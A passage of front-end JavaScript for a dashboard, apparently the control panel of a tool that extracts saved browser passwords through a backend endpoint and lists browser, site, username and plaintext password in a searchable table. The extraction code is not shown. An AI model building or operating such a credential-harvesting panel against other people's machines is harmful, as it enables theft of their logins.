    const errorOverlay = document.getElementById('media-error-box');
    const errorMessageEl = document.getElementById('error-message');
    if (errorMessageEl) errorMessageEl.innerText = msg;
    if (errorOverlay) errorOverlay.style.display = 'flex';
}

// Hides overlay errors
function hideError() {
    const errorOverlay = document.getElementById('media-error-box');
    if (errorOverlay) errorOverlay.style.display = 'none';
}

// ---------------- PASSWORD MANAGER FUNCTIONS ---------------- //
let rawPasswords = [];

function loadPasswords() {
    const body = document.getElementById('passwords-table-body');
    body.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding:2rem; font-size:0.72rem;">LOADING CACHED PASSWORDS...</td></tr>';

    fetch('/api/passwords')
        .then(res => res.json())
        .then(data => {
            rawPasswords = data || [];
            renderPasswords(rawPasswords);
        })
        .catch(err => {
            console.error(`Error loading passwords: ${err.message}`);
            body.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--glow-red); padding:2rem; font-size:0.72rem;">ERROR LOADING PASSWORDS: ${err.message}</td></tr>`;
        });
}

function extractPasswords() {
    const icon = document.getElementById('pass-refresh-icon');
    const body = document.getElementById('passwords-table-body');
    
    if (icon) icon.classList.add('spin-anim');
    body.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--glow-cyan); padding:2rem; font-size:0.72rem;">EXTRACTING PASSWORDS (ENSURE BROWSERS ARE CLOSED)...</td></tr>';

    fetch('/api/passwords/extract', { method: 'POST' })
        .then(res => res.json())
        .then(data => {
            if (icon) icon.classList.remove('spin-anim');
            if (data.success) {
                rawPasswords = data.passwords || [];
                renderPasswords(rawPasswords);
            } else {
                body.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--glow-red); padding:2rem; font-size:0.72rem;">EXTRACTION FAILED: ${data.error}</td></tr>`;
            }
        })
        .catch(err => {
            if (icon) icon.classList.remove('spin-anim');
            console.error(`Error extracting passwords: ${err.message}`);
            body.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--glow-red); padding:2rem; font-size:0.72rem;">NETWORK ERROR: ${err.message}</td></tr>`;
        });
}

function renderPasswords(passwordsList) {
    const body = document.getElementById('passwords-table-body');
    body.innerHTML = '';
    
    if (passwordsList.length === 0) {
        body.innerHTML = `
            <tr>
                <td colspan="5" style="text-align:center;color:var(--text-muted);padding:2rem;font-size:0.72rem;">
                    <i data-lucide="key" style="width:28px;height:28px;margin-bottom:0.5rem;opacity:0.3;display:block;margin-left:auto;margin-right:auto;"></i>
                    &gt; NO PASSWORDS FOUND. CLICK REFRESH TO EXTRACT.
                </td>
            </tr>`;
        lucide.createIcons();
        return;
    }
    
    passwordsList.forEach(item => {
        const tr = document.createElement('tr');
        
        const tdBrowser = document.createElement('td');
        tdBrowser.style.fontWeight = 'bold';
        tdBrowser.style.color = 'var(--glow-cyan)';
        tdBrowser.textContent = item.browser;
        tr.appendChild(tdBrowser);
        
        const tdUrl = document.createElement('td');
        tdUrl.className = 'proc-name'; // Re-use processes table truncation/hover style
        tdUrl.textContent = item.url;
        tdUrl.title = item.url;
        tr.appendChild(tdUrl);
        
        const tdUser = document.createElement('td');
        tdUser.textContent = item.user;
        tdUser.title = item.user;
        tr.appendChild(tdUser);
        
        const tdPass = document.createElement('td');
        tdPass.style.fontFamily = 'var(--font-mono)';
        tdPass.style.color = 'var(--text-accent)';
        tdPass.textContent = item.pass;
        tr.appendChild(tdPass);
        
        const tdDate = document.createElement('td');
        tdDate.style.textAlign = 'right';
        tdDate.style.fontSize = '0.7rem';
        tdDate.style.color = 'var(--text-muted)';
        tdDate.textContent = item.date;
        tr.appendChild(tdDate);
        
        body.appendChild(tr);
    });
}

function filterPasswords() {
    const query = document.getElementById('pass-search-input').value.toLowerCase().trim();
    if (!query) {
        renderPasswords(rawPasswords);
        return;
    }
    
    const filtered = rawPasswords.filter(p => 
        (p.browser && p.browser.toLowerCase().includes(query)) ||
        (p.url && p.url.toLowerCase().includes(query)) || 
        (p.user && p.user.toLowerCase().includes(query)) ||
        (p.pass && p.pass.toLowerCase().includes(query))
    );
    renderPasswords(filtered);
}

